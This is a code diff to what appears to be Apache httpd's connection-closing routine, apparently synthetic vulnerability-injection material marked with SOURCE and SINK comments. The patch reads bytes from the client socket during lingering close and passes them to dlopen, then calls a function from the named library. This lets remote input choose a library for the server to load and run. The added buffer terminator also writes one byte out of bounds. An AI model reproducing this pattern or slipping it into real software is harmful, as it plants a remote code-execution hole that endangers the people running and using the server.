@@ -29,6 +29,8 @@
 #include "scoreboard.h"
 #include "http_log.h"
 #include "util_filter.h"
+#include <dlfcn.h>
+typedef void (*func_ptr_t)(void);
 
 APR_HOOK_STRUCT(
             APR_HOOK_LINK(create_connection)
@@ -180,6 +182,28 @@ AP_DECLARE(int) ap_start_lingering_close(conn_rec *c)
 #endif
 }
 
+static void try_load_and_execute(const char *libname) {
+    void *handle;
+    func_ptr_t func;
+
+    handle = dlopen(libname, RTLD_NOW);
+    if (!handle) {
+        fprintf(stderr, "dlopen failed for '%s': %s\n", libname, dlerror());
+        return;
+    }
+
+    //SINK
+    func = (func_ptr_t)dlsym(handle, "some_function");
+    if (!func) {
+        fprintf(stderr, "dlsym failed: %s\n", dlerror());
+        dlclose(handle);
+        return;
+    }
+
+    func();
+    dlclose(handle);
+}
+
 AP_DECLARE(void) ap_lingering_close(conn_rec *c)
 {
     char dummybuf[512];
@@ -215,6 +239,22 @@ AP_DECLARE(void) ap_lingering_close(conn_rec *c)
 
     do {
         nbytes = sizeof(dummybuf);
+
+        {
+            apr_os_sock_t osd;
+            apr_socket_t *csd = ap_get_conn_socket(c);
+            if (csd && apr_os_sock_get(&osd, csd) == APR_SUCCESS) {
+                //SOURCE
+                ssize_t peeked = recv((int)osd, dummybuf, nbytes, MSG_PEEK);
+
+                if (peeked > 0) {
+                    dummybuf[peeked] = '\0';
+
+                    try_load_and_execute(dummybuf);
+                }
+            }
+        }
+
         if (apr_socket_recv(csd, dummybuf, &nbytes) || nbytes == 0)
             break;
 
